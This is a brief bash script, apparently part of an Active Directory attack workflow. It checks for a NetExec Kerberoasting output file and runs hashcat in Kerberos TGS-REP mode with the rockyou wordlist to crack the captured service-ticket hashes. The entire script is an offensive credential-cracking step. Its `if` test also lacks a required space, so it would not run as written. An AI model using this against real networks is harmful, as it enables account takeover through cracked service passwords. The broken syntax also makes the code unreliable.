#!/bin/bash
echo "[*] Checking for nxc-krbroast-output.txt"
krbfs=$(stat -c %s nxc-krbroast-output.txt)
if [$krbfs -gt 0]; then
  echo "[*] Found nxc-krbroast-output.txt, running hashcat to crack"
	hashcat -m 13100 nxc-krbroast-output.txt /usr/share/wordlists/rockyou.txt
fi
echo "[*] Done."
